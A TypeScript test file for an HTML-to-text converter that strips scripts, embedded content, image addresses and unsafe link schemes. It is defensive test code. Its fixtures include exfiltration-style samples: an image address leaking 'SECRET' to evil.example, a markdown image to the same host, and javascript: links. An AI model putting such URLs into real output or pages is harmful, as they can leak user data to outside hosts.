import { describe, expect, test } from "bun:test";
import { decodeBody, htmlToText, pageText } from "../page-text";

const base = new URL("https://docs.example.com/guide/index.html");
const text = (html: string) => htmlToText(html, base);

describe("page text", () => {
  test("keeps visible text and drops scripts, styles, templates, embedded content and noscript fallbacks", async () => {
    const html = `<html><head><title>Guide</title><style>.a{x:y}</style><script>steal()</script></head><body>
      <h1>Intro</h1><p>Hello <b>world</b>.</p><script>alert("x")</script><noscript>turn on js</noscript>
      <template><p>hidden</p></template><svg><text>vector</text></svg><iframe>frame text</iframe><object>obj</object><canvas>c</canvas>
      <embed src="x.swf"><p>after</p></body></html>`;
    const out = await text(html);
    expect(out).toBe("Guide\n\nIntro\n\nHello world.\n\nafter");
    for (const gone of ["steal", "alert", "turn on js", "hidden", "vector", "frame text", "obj", ".a{"]) expect(out).not.toContain(gone);
  });

  test("an unclosed element that is skipped does not matter for ordinary pages: a void embed does not swallow the rest", async () => {
    expect(await text('<p>one</p><embed src="a"><p>two</p>')).toBe("one\n\ntwo");
  });

  test("a self-closing element that would otherwise be skipped does not make the page unreadable", async () => {
    expect(await text('<p>before</p><svg/><p>after</p><iframe src="x"/><object data="y"/><template/>')).toBe("before\n\nafter");
  });

  test("an image is its alt text and nothing else: no address, no markup", async () => {
    const out = await text('<p>See <img src="https://evil.example/leak?q=SECRET" alt="a chart &amp; table"> here <img src="https://evil.example/x.png"></p>');
    expect(out).toBe("See a chart & table here");
    expect(out).not.toMatch(/evil|src=|https:|<img/);
  });

  test("a link is its text and its address, resolved against the page; fragments, other schemes and junk are dropped", async () => {
    const html = `<a href="/docs/next#part">Next</a> <a href="https://other.example.org/a?b=1">Other</a> <a href="mailto:a@b.c">mail</a>
      <a href="javascript:alert(1)">js</a> <a href="data:text/html,hi">data</a> <a href="http://[bad">bad</a> <a href="../up">Up</a> <a>no href</a>`;
    const out = await text(html);
    expect(out).toContain("Next (https://docs.example.com/docs/next)");
    expect(out).toContain("Other (https://other.example.org/a?b=1)");
    expect(out).toContain("Up (https://docs.example.com/up)");
    for (const gone of ["mailto", "javascript", "data:", "[bad", "#part"]) expect(out).not.toContain(gone);
    expect(out).toContain("no href");
  });

  test("an address longer than the limit is not offered", async () => {
    expect(await text(`<a href="https://a.example.com/${"x".repeat(3000)}">long</a>`)).toBe("long");
  });

  test("entities are decoded, including across the numeric forms and the ones that are not text", async () => {
    expect(await text("<p>a &amp; b &lt;c&gt; &quot;d&quot; &#39;e&#39; &#x41;&#66; x&nbsp;y &unknown; &#0; &#xD800; &#1114112;</p>")).toBe('a & b <c> "d" \'e\' AB x y &unknown;');
  });

  test("markup that would be an instruction to a renderer stays text and is not interpreted", async () => {
    const out = await text("<p>&lt;script&gt;x()&lt;/script&gt; ![img](https://evil.example/p.png)</p>");
    expect(out).toBe("<script>x()</script> ![img](https://evil.example/p.png)");
  });

  test("white space is collapsed and block elements separate lines", async () => {
    expect(await text("<div>a   b\t\tc</div><div>d</div><ul><li>x</li><li>y</li></ul><br><br><br><br>z")).toBe("a b c\nd\n\nx\ny\n\nz");
  });

  test("broken HTML does not throw and keeps what is readable", async () => {
    const out = await text("<p>ok</p><div <<<>><a href='x'>y</a><scr<script>ipt>z</p></div></p>>>&&&;;<!-- <p>c</p> --><![CDATA[q]]>");
    expect(out).toContain("ok");
    expect(out).not.toContain("<p>c</p>");
    expect(await text("")).toBe("");
    expect(await text("<" + "a".repeat(100_000))).toBeTypeOf("string");
  });
});

describe("decoding", () => {
  test("the declared charset is used, and an unknown one falls back to UTF-8", () => {
    const latin = new Uint8Array([0x63, 0x61, 0x66, 0xe9]);
    expect(decodeBody(latin, "text/html; charset=iso-8859-1")).toBe("café");
    expect(decodeBody(new TextEncoder().encode("café"), "text/html; charset=nonsense")).toBe("café");
    expect(decodeBody(new TextEncoder().encode("café"), "text/html")).toBe("café");
    expect(decodeBody(new Uint8Array([0xff, 0xfe, 0x41]), "text/html")).toContain("A");
  });

  test("plain text is returned as text, not parsed as HTML", async () => {
    expect(await pageText(new TextEncoder().encode("a <b>bold</b>\r\nline &amp; more"), "text/plain", base, "text/plain")).toBe("a <b>bold</b>\nline &amp; more");
    expect(await pageText(new TextEncoder().encode("<p>hi</p>"), "text/html", base, "text/html")).toBe("hi");
  });
});
